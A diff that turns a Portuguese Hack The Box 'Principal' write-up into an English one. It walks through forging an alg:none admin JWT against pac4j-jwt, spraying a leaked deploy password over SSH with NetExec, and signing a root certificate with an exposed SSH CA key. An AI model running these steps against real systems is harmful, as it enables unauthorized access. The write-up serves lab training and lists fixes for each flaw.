@@ -1,79 +1,50 @@
-# Hack The Box — Principal
+## Summary
 
-![HTB](https://img.shields.io/badge/Platform-Hack%20The%20Box-green)
-![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow)
-![OS](https://img.shields.io/badge/OS-Linux-orange)
-![Category](https://img.shields.io/badge/Category-Web%20%7C%20Auth%20Bypass%20%7C%20SSH%20CA-red)
+Principal is a Medium Linux machine whose web app uses **pac4j-jwt 6.0.3**,
+vulnerable to an authentication bypass (CVE-2026-29000): the server decrypts the
+JWE but fails to validate the inner JWT signature, so an `alg:none` token can be
+forged with any role. Admin access leaks a deployment password, reused over SSH
+(password spray) as `svc-deploy`. A misconfigured **SSH CA** (no
+`AuthorizedPrincipalsFile`) lets any CA-signed certificate authenticate as
+**root**.
 
----
+## Machine Information
 
-# Informações da Máquina
+| Name | Difficulty | OS | Platform |
+| --- | --- | --- | --- |
+| Principal | Medium | Linux | Hack The Box |
 
-| Nome      | Dificuldade | Plataforma      | OS    |
-|-----------|------------|----------------|-------|
-| Principal | Medium     | Hack The Box   | Linux |
+## Attack Path
 
----
+1. Nmap reveals SSH and a web application on port 8080.
+2. The app is identified as pac4j-jwt.
+3. An auth bypass is exploited (CVE-2026-29000).
+4. An admin token is forged.
+5. Credentials are extracted from the dashboard.
+6. SSH access via password spray as `svc-deploy`.
+7. A misconfigured SSH CA is abused.
+8. A forged certificate grants root.
 
-# Superfície de ataque
+## Reconnaissance
 
-1. Enumeração inicial com Nmap  
-2. Análise da aplicação web (pac4j-jwt)  
-3. Exploração de auth bypass (CVE-2026-29000)  
-4. Forjamento de token admin  
-5. Extração de credenciais do dashboard  
-6. Acesso via SSH (password spray)  
-7. Abuso de SSH CA mal configurado  
-8. Escalação para root via certificado forjado  
+Initial enumeration was performed with **Nmap**.
 
----
-
-# Reconhecimento
-
-```
+```bash
 nmap -sC -sV -T4 10.129.244.220
 ```
 
-![Nmap](screenshots/nmap.png)
+| Port | Service | Notes |
+| --- | --- | --- |
+| 22 | SSH | OpenSSH 9.6p1 |
+| 8080 | HTTP | Jetty — uses pac4j-jwt 6.0.3 |
 
-O scan revelou dois serviços principais:
+## Web Enumeration
 
-- Porta 22 → SSH (OpenSSH 9.6p1)
-- Porta 8080 → Aplicação web (Jetty)
+The application at `http://10.129.244.220:8080` presented a login panel. Default
+credentials failed, and the login request hit `/api/auth/login`.
 
-Além disso, foi possível identificar que a aplicação utiliza **pac4j-jwt 6.0.3**, o que será essencial para a exploração.
-
----
-
-# Enumeração Web
-
-A aplicação web está disponível em:
-
-```
-http://10.129.244.220:8080
-```
-
-![Web](screenshots/web.png)
-
-Ao acessar, encontramos um painel de login.
-
-Durante testes iniciais:
-
-- Credenciais padrão não funcionam
-- Requisição vai para `/api/auth/login`
-
----
-
-## Análise do JavaScript
-
-Ao analisar `/static/js/app.js`, encontramos informações críticas:
-
-![Endpoints](screenshots/endpoints.png)
-
-- Uso de JWT com:
-  - **JWE (criptografia)**
-  - **JWS (assinatura)**
-- Endpoints:
+Analyzing `/static/js/app.js` revealed the JWT scheme (JWE encryption + JWS
+signature) and several endpoints:
 
 ```
 /api/auth/login
@@ -83,276 +54,119 @@ Ao analisar `/static/js/app.js`, encontramos informações críticas:
 /api/settings
 ```
 
-Especial atenção ao endpoint:
+The `/api/auth/jwks` endpoint exposed the RSA public key used to encrypt the
+JWT.
 
-```
-/api/auth/jwks
-```
-
----
-
-# Coleta da chave pública
-
-```
+```bash
 curl http://10.129.244.220:8080/api/auth/jwks | jq
 ```
 
-![JWKS](screenshots/public-key.png)
+## Exploitation — pac4j-jwt Auth Bypass (CVE-2026-29000)
 
-Esse endpoint fornece a **chave pública RSA** usada para criptografar o JWT.
+The flaw: the server decrypts the JWE correctly but does not validate the inner
+JWT signature. A token with `alg:none` has no signature, and the check is
+skipped — allowing a forged token with an arbitrary role.
 
----
-
-# Vulnerabilidade
-
-## CVE-2026-29000 — pac4j-jwt Auth Bypass
-
-![CVE](screenshots/cve.png)
-
-Vulnerabilidade:
-
-- O sistema descriptografa o JWE corretamente
-- Mas falha ao validar a assinatura do JWT interno
-
-Fluxo vulnerável:
-
-1. Servidor descriptografa o JWE
-2. Extrai o payload interno
-3. Se for `alg:none`, não existe assinatura
-4. Verificação é ignorada completamente
-
-Resultado:
-
-→ Podemos forjar um token com qualquer role (ex: admin)
-
----
-
-# Exploração
-
-```
+```bash
 python3 cve.py http://10.129.244.220:8080
 ```
 
-![Exploit](screenshots/auth-token.png)
-
-O script:
-
-1. Baixa a chave pública (JWKS)
-2. Cria um JWT com `alg:none`
-3. Define:
-
-```
-sub = admin
-role = ROLE_ADMIN
-```
-
-4. Envolve em um JWE válido
-5. Envia para o servidor
-
-Resultado:
+The script fetches the public key (JWKS), builds an `alg:none` JWT with
+`sub=admin` and `role=ROLE_ADMIN`, wraps it in a valid JWE, and sends it:
 
 ```
 Authenticated as: admin (ROLE_ADMIN)
 ```
 
----
+Setting the token in `Session Storage → auth_token` granted full admin access
+to the dashboard.
 
-# Acesso ao Dashboard
+## Initial Access (User)
 
-Inserimos o token no navegador:
-
-```
-Session Storage → auth_token
-```
-
-Após atualizar a página, acesso completo ao painel admin.
-
----
-
-# Enumeração interna
-
-## Usuários
-
-![Users](screenshots/users.png)
-
-Lista de usuários obtida via `/api/users`.
-
----
-
-## Credencial encontrada
-
-![Key](screenshots/encryption-key.png)
-
-Na aba **Settings → Security**, encontramos:
+The admin dashboard listed users via `/api/users`. Under **Settings →
+Security**, a password was exposed:
 
 ```
 D3pl0y_$$H_Now42!
 ```
 
----
+A password spray identified a valid SSH account:
 
-# Acesso via SSH
-
-Realizamos password spray:
-
-```
+```bash
 nxc ssh 10.129.244.220 -u users.txt -p 'D3pl0y_$$H_Now42!'
 ```
 
-![SSH](screenshots/ssh.png)
-
-Resultado:
-
 ```
-svc-deploy → acesso válido
-```
-
-Login:
-
-```
+svc-deploy → valid
 ssh svc-deploy@10.129.244.220
 ```
 
----
+The user flag lives at `/home/svc-deploy/user.txt`.
 
-# User Flag
+## Privilege Escalation
 
-```
-cat user.txt
-```
+### Enumeration
 
-![User](screenshots/user-flag.png)
-
-```
-819cec.....................
-```
-
----
-
-# Escalação de Privilégio
-
-## Enumeração
-
-O usuário pertence ao grupo:
-
-```
-deployers
-```
-
-Diretório crítico:
+`svc-deploy` belonged to the `deployers` group and could read a critical
+directory:
 
 ```
 /opt/principal/ssh
 ```
 
-![Files](screenshots/sensitive-files.png)
-
-Conteúdo:
-
-- ca (chave privada da CA)
-- ca.pub
-- README
-
----
-
-## Configuração SSH
+It contained the SSH CA private key (`ca`), `ca.pub`, and a README. The SSH
+config trusted the CA:
 
 ```
 TrustedUserCAKeys /opt/principal/ssh/ca.pub
 ```
 
-Problema identificado:
+Critically, there was **no `AuthorizedPrincipalsFile`**, so any certificate
+signed by the CA is accepted with no identity validation.
 
-- Não existe `AuthorizedPrincipalsFile`
+### Forging a root certificate
 
-Impacto:
-
-→ Qualquer certificado assinado pela CA é aceito  
-→ Sem validação de identidade (username)
-
----
-
-# Exploração (Privesc)
-
-Gerar chave:
-
-```
+```bash
 ssh-keygen -t ed25519 -f /tmp/pwn -N ""
-```
-
-Assinar com a CA:
-
-```
 ssh-keygen -s /opt/principal/ssh/ca -I pwn-root -n root -V +1h /tmp/pwn.pub
 ```
 
-![Keygen](screenshots/ssh-keygen.png)
+This produced a valid certificate for the `root` principal:
 
-Isso cria um certificado válido para:
-
-```
-principal = root
-```
-
----
-
-## Login como root
-
-```
+```bash
 ssh -i /tmp/pwn root@localhost
 ```
 
-Acesso root obtido.
+The root flag lives at `/root/root.txt`.
 
----
+## Vulnerability Analysis
 
-# Root Flag
+**JWT auth bypass (CVE-2026-29000)** — pac4j-jwt decrypted the JWE but skipped
+inner JWT signature validation, accepting `alg:none` and allowing a forged admin
+token. Fix: upgrade pac4j, explicitly reject `alg:none`, and always verify the
+inner signature after decryption.
 
-```
-cat /root/root.txt
-```
+**Credential exposure** — a deployment password was readable in the admin
+dashboard settings, enabling SSH access via password spray. Fix: never expose
+secrets in application UI/responses and store them in a secrets manager.
 
-![Root](screenshots/root-flag.png)
+**SSH CA misconfiguration** — `TrustedUserCAKeys` was set without
+`AuthorizedPrincipalsFile`, and the CA private key was readable, allowing forging
+a certificate for any principal including root. Fix: protect the CA private key,
+define `AuthorizedPrincipalsFile`, and constrain certificate principals.
 
-```
-a57f6d.....................
-```
+## Tools Used
 
----
+- Nmap
+- curl
+- Python 3
+- jwcrypto
+- NetExec
+- SSH
 
-# Vulnerabilidades Identificadas
+## Key Takeaways
 
-### CVE-2026-29000
-Bypass de autenticação via JWT mal validado  
-
-### Credenciais expostas
-Senha acessível no painel  
-
-### SSH CA Misconfiguration
-Permite forjar identidade e escalar para root  
-
----
-
-# Ferramentas Utilizadas
-
-- Nmap  
-- curl  
-- Python3  
-- jwcrypto  
-- NetExec  
-- SSH  
-
----
-
-# Principais Aprendizados
-
-- Validação de assinatura é crítica em JWT  
-- Criptografia sem validação de identidade é inútil  
-- CA mal configurada compromete todo o sistema  
-- Cadeias de confiança são alvos comuns em pentest  
-
----
-
-# Autor
-
-https://github.com/ninjaa-exe
+- Signature validation is critical in JWT; encryption without identity validation is useless.
+- `alg:none` handling must be explicitly rejected.
+- A misconfigured SSH CA (or a readable CA key) compromises the whole trust chain.
+- Trust chains are common, high-value targets in real engagements.
